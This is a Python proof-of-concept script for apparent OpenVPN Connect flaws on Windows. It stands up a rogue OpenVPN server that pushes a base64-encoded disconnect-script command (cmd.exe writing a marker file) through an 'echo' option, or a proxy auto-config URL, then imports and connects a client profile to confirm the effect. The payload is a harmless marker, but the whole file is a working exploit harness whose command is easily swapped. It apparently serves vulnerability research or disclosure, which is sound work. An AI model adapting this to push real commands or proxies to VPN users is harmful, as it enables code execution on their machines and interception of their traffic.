from __future__ import annotations

import argparse
import base64
import json
import os
import shutil
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parent
CERT_DIR = ROOT / "certs"
RUNTIME_DIR = ROOT / "runtime"
DEFAULT_PORT = 11940
DEFAULT_MARKER_NAME = "openvpn_connect_echo_script_ace_marker.txt"
PROFILE_NAME_PREFIX = "openvpn-connect-pushed-option-poc"
FINDING_ECHO_SCRIPT = "echo-script"
FINDING_PROXY_AUTO_CONFIG = "proxy-auto-config"
DEFAULT_PAC_URL = "http://127.0.0.1:18080/openvpn-connect-ace.pac"


def b64(text: str) -> str:
    return base64.b64encode(text.encode("utf-8")).decode("ascii")


def ovpn_path(path: Path) -> str:
    return str(path.resolve()).replace("\\", "/")


def read_text(path: Path) -> str:
    return path.read_text(encoding="ascii")


def require_file(path: Path) -> None:
    if not path.is_file():
        raise FileNotFoundError(f"Required file is missing: {path}")


def default_marker_path() -> Path:
    return Path(tempfile.gettempdir()) / DEFAULT_MARKER_NAME


def default_connect_exe() -> Path | None:
    env = os.environ.get("OPENVPN_CONNECT_EXE")
    if env:
        return Path(env)
    candidate = Path(r"C:\Program Files\OpenVPN Connect\OpenVPNConnect.exe")
    return candidate if candidate.is_file() else None


def default_openvpn_exe() -> str | None:
    env = os.environ.get("OPENVPN_EXE")
    if env:
        return env
    found = shutil.which("openvpn.exe") or shutil.which("openvpn")
    if found:
        return found
    candidate = Path(r"C:\Program Files\OpenVPN\bin\openvpn.exe")
    return str(candidate) if candidate.is_file() else None


def build_payload_command(marker: Path) -> str:
    marker_text = str(marker)
    if '"' in marker_text:
        raise ValueError("Marker path must not contain a double quote")
    return f'cmd.exe /c echo OPENVPN_CONNECT_ECHO_SCRIPT_ACE>"{marker_text}"'


def build_server_config(port: int, finding: str, command: str, pac_url: str) -> str:
    if finding == FINDING_ECHO_SCRIPT:
        key = b64("script.win.user.disconnect")
        value = b64(command)
        pushes = [f'push "echo 0:0:{key}.{value}"']
    else:
        pushes = [f'push "dhcp-option PROXY_AUTO_CONFIG_URL {pac_url}"']

    return "\n".join(
        [
            f"port {port}",
            "proto tcp-server",
            "dev null",
            "mode server",
            "tls-server",
            f'ca "{ovpn_path(CERT_DIR / "ca.crt")}"',
            f'cert "{ovpn_path(CERT_DIR / "server.crt")}"',
            f'key "{ovpn_path(CERT_DIR / "server.key")}"',
            "dh none",
            "server 10.88.0.0 255.255.255.0",
            "topology subnet",
            "keepalive 1 3",
            "duplicate-cn",
            *pushes,
            'push "ping 1"',
            'push "ping-restart 3"',
            "verb 4",
            f'status "{ovpn_path(RUNTIME_DIR / "server.status")}"',
            f'log "{ovpn_path(RUNTIME_DIR / "server.log")}"',
            "",
        ]
    )


def build_client_config(port: int) -> str:
    return "\n".join(
        [
            "client",
            "dev tun",
            "proto tcp-client",
            f"remote 127.0.0.1 {port}",
            "nobind",
            "persist-key",
            "persist-tun",
            "remote-cert-tls server",
            "auth SHA256",
            "cipher AES-256-GCM",
            "data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305",
            "verb 4",
            "connect-retry-max 1",
            "resolv-retry 1",
            "<ca>",
            read_text(CERT_DIR / "ca.crt").strip(),
            "</ca>",
            "<cert>",
            read_text(CERT_DIR / "client.crt").strip(),
            "</cert>",
            "<key>",
            read_text(CERT_DIR / "client.key").strip(),
            "</key>",
            "",
        ]
    )


def build_configs(port: int, marker: Path, finding: str, pac_url: str) -> tuple[Path, Path, str]:
    for name in ["ca.crt", "server.crt", "server.key", "client.crt", "client.key"]:
        require_file(CERT_DIR / name)
    RUNTIME_DIR.mkdir(exist_ok=True)
    command = build_payload_command(marker) if finding == FINDING_ECHO_SCRIPT else ""
    server_config = RUNTIME_DIR / "server.ovpn"
    client_config = RUNTIME_DIR / f"client_{finding.replace('-', '_')}_poc.ovpn"
    server_config.write_text(build_server_config(port, finding, command, pac_url), encoding="ascii")
    client_config.write_text(build_client_config(port), encoding="ascii")
    detail = command if finding == FINDING_ECHO_SCRIPT else pac_url
    return server_config, client_config, detail


def run(args: list[str], check: bool = False) -> subprocess.CompletedProcess[str]:
    completed = subprocess.run(
        args,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    if check and completed.returncode != 0:
        raise RuntimeError(
            f"Command failed with exit {completed.returncode}: {' '.join(args)}\n{completed.stdout}"
        )
    return completed


def start_server(openvpn_exe: str, server_config: Path) -> subprocess.Popen[bytes]:
    stdout = open(RUNTIME_DIR / "server.stdout.txt", "wb")
    stderr = open(RUNTIME_DIR / "server.stderr.txt", "wb")
    proc = subprocess.Popen(
        [openvpn_exe, "--config", str(server_config)],
        cwd=str(RUNTIME_DIR),
        stdout=stdout,
        stderr=stderr,
    )
    time.sleep(2)
    if proc.poll() is not None:
        raise RuntimeError(
            "OpenVPN server exited early. Check runtime/server.log and "
            "runtime/server.stderr.txt for details."
        )
    return proc


def stop_process(proc: subprocess.Popen[bytes] | None) -> None:
    if not proc or proc.poll() is not None:
        return
    if os.name == "nt":
        proc.terminate()
    else:
        proc.send_signal(signal.SIGTERM)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()


def connect_cli(connect_exe: Path, *args: str) -> subprocess.CompletedProcess[str]:
    return run([str(connect_exe), *args])


def list_profiles(connect_exe: Path) -> list[dict]:
    output = connect_cli(connect_exe, "--list-profiles").stdout.strip()
    if not output:
        return []
    try:
        data = json.loads(output)
        return data if isinstance(data, list) else []
    except json.JSONDecodeError:
        return []


def import_profile(connect_exe: Path, client_config: Path, profile_name: str) -> str:
    before = {item.get("id") for item in list_profiles(connect_exe)}
    completed = connect_cli(
        connect_exe,
        f"--import-profile={client_config}",
        f"--name={profile_name}",
    )
    text = completed.stdout.strip()
    if text:
        try:
            parsed = json.loads(text)
            profile_id = parsed.get("message", {}).get("id")
            if profile_id:
                return str(profile_id)
        except json.JSONDecodeError:
            pass

    time.sleep(2)
    for item in list_profiles(connect_exe):
        if item.get("id") not in before and item.get("name") == profile_name:
            return str(item["id"])
    raise RuntimeError(f"Could not determine imported profile id. Import output:\n{text}")


def proxy_state() -> dict[str, object | None]:
    if os.name != "nt":
        return {}
    import winreg

    path = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
    names = ["AutoConfigURL", "ProxyEnable", "ProxyServer", "ProxyOverride"]
    state: dict[str, object | None] = {}
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
        for name in names:
            try:
                state[name] = winreg.QueryValueEx(key, name)[0]
            except FileNotFoundError:
                state[name] = None
    return state


def auto_mode(
    openvpn_exe: str,
    connect_exe: Path,
    server_config: Path,
    client_config: Path,
    marker: Path,
    finding: str,
) -> None:
    if finding == FINDING_ECHO_SCRIPT and marker.exists():
        marker.unlink()

    server = None
    profile_id = None
    profile_name = f"{PROFILE_NAME_PREFIX}-{finding}-{int(time.time())}"
    before_proxy = proxy_state() if finding == FINDING_PROXY_AUTO_CONFIG else {}
    try:
        connect_cli(connect_exe, "--quit")
        time.sleep(2)
        server = start_server(openvpn_exe, server_config)
        profile_id = import_profile(connect_exe, client_config, profile_name)
        connect_cli(connect_exe, f"--connect-shortcut={profile_id}", "--minimize")
        print(f"[+] Imported profile id: {profile_id}")
        print("[+] Waiting for connect and server-pushed option handling...")
        time.sleep(16)

        if finding == FINDING_PROXY_AUTO_CONFIG:
            print("[+] Proxy state before connect:")
            print(json.dumps(before_proxy, indent=2))
            print("[+] Proxy state during connection:")
            print(json.dumps(proxy_state(), indent=2))

        connect_cli(connect_exe, "--disconnect-shortcut")
        time.sleep(4)

        if finding == FINDING_ECHO_SCRIPT and marker.is_file():
            print(f"[+] Marker created: {marker}")
            print(marker.read_text(encoding="utf-8", errors="replace").strip())
        elif finding == FINDING_ECHO_SCRIPT:
            print(f"[-] Marker was not created: {marker}")
            print("    Check OpenVPN Connect logs and runtime/server.log.")
        else:
            print("[+] Proxy state after disconnect:")
            print(json.dumps(proxy_state(), indent=2))
    finally:
        if profile_id:
            connect_cli(connect_exe, f"--remove-profile={profile_id}")
        connect_cli(connect_exe, "--quit")
        stop_process(server)


def server_mode(openvpn_exe: str, server_config: Path, client_config: Path, marker: Path, finding: str, pac_url: str) -> None:
    print(f"[+] Client profile: {client_config}")
    if finding == FINDING_ECHO_SCRIPT:
        print(f"[+] Marker path after disconnect: {marker}")
    else:
        print(f"[+] Pushed PAC URL: {pac_url}")
    print("[+] Starting local malicious OpenVPN server. Press Ctrl+C to stop.")
    server = start_server(openvpn_exe, server_config)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopping server...")
    finally:
        stop_process(server)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Benign OpenVPN Connect server-pushed option PoC without PowerShell."
    )
    parser.add_argument("--mode", choices=["build", "server", "auto"], default="build")
    parser.add_argument("--finding", choices=[FINDING_ECHO_SCRIPT, FINDING_PROXY_AUTO_CONFIG], default=FINDING_ECHO_SCRIPT)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--marker", type=Path, default=default_marker_path())
    parser.add_argument("--pac-url", default=DEFAULT_PAC_URL)
    parser.add_argument("--openvpn", default=default_openvpn_exe(), help="Path to OpenVPN 2.x openvpn executable")
    parser.add_argument("--connect", type=Path, default=default_connect_exe(), help="Path to OpenVPNConnect.exe")
    args = parser.parse_args()

    server_config, client_config, detail = build_configs(args.port, args.marker, args.finding, args.pac_url)
    print(f"[+] Wrote {server_config}")
    print(f"[+] Wrote {client_config}")
    if args.finding == FINDING_ECHO_SCRIPT:
        print(f"[+] Pushed disconnect command: {detail}")
    else:
        print(f"[+] Pushed PAC URL: {detail}")

    if args.mode == "build":
        print("[+] Build-only mode complete.")
        return 0

    if not args.openvpn:
        print("[-] Could not find OpenVPN 2.x. Pass --openvpn or set OPENVPN_EXE.", file=sys.stderr)
        return 2

    if args.mode == "server":
        server_mode(args.openvpn, server_config, client_config, args.marker, args.finding, args.pac_url)
        return 0

    if not args.connect or not args.connect.is_file():
        print("[-] Could not find OpenVPN Connect. Pass --connect or set OPENVPN_CONNECT_EXE.", file=sys.stderr)
        return 2

    auto_mode(args.openvpn, args.connect, server_config, client_config, args.marker, args.finding)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
